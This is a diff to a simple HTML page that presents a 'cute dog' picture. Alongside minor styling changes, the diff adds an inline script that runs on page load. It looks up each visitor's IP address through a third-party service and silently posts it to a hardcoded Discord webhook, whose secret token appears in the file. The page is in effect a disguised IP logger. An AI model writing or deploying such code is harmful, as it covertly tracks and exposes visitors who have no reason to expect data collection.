@@ -2,27 +2,43 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Interesting Dog</title>
   <style>
     body {
       margin: 0;
-      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      background-color: #f0f0f0;
-      font-family: Arial, sans-serif;
+      height: 100vh;
+      background: #eee;
     }
     img {
-      max-width: 90%;
-      height: auto;
+      max-width: 90vw;
+      max-height: 90vh;
       border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
     }
   </style>
 </head>
 <body>
-  <img src="/.netlify/functions/logAndServeDog" alt="A cute dog" />
+  <img src="dog.png" alt="A cute dog" />
+
+  <script>
+    const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1384059457054572564/-d1jkEYCaQjbBga4Unbalu8AKOc7OsYYK6__vGUHGuheXBeTZE2_1uPp3YLDEaaf42z6";
+
+    // Get visitor IP from third-party API
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        // Send IP to Discord webhook
+        fetch(DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: `Dog viewed by IP: ${ip}` }),
+        });
+      })
+      .catch(err => console.error("Failed to get IP or send webhook", err));
+  </script>
 </body>
 </html>
